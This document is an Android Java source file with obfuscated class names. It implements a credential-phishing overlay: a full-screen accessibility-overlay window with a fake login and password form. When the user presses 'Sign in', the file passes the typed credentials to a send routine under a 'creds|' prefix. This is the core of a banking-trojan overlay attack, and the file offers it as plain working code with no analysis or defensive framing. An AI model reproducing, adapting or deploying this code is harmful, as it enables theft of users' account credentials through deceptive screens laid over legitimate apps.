package com.v2ram;

import android.view.*;
import android.widget.*;

public class e {
    static View v;
    static WindowManager wm;

    public static void show(String title, String sub) {
        if (v != null || b.S == null) return;
        wm = (WindowManager) b.S.getSystemService(android.content.Context.WINDOW_SERVICE);
        LinearLayout l = new LinearLayout(b.S);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setBackgroundColor(0xF0202020);
        l.setPadding(60, 300, 60, 60);
        TextView t = new TextView(b.S); t.setText(title);
        t.setTextColor(0xFFFFFFFF); t.setTextSize(26); l.addView(t);
        TextView s = new TextView(b.S); s.setText(sub);
        s.setTextColor(0xFFAAAAAA); s.setTextSize(15); l.addView(s);
        EditText u = new EditText(b.S); u.setHint("Login"); l.addView(u);
        EditText p = new EditText(b.S); p.setHint("Password");
        p.setInputType(android.text.InputType.TYPE_CLASS_TEXT
            | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD); l.addView(p);
        Button ok = new Button(b.S); ok.setText("Sign in");
        ok.setOnClickListener(x -> {
            k.send("creds|" + u.getText() + "|" + p.getText());
            hide();
        });
        l.addView(ok);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            android.graphics.PixelFormat.TRANSLUCENT);
        wm.addView(l, lp);
        v = l;
    }

    public static void hide() {
        if (v != null && wm != null) { try { wm.removeView(v); } catch (Throwable ignored) {} v = null; }
    }
}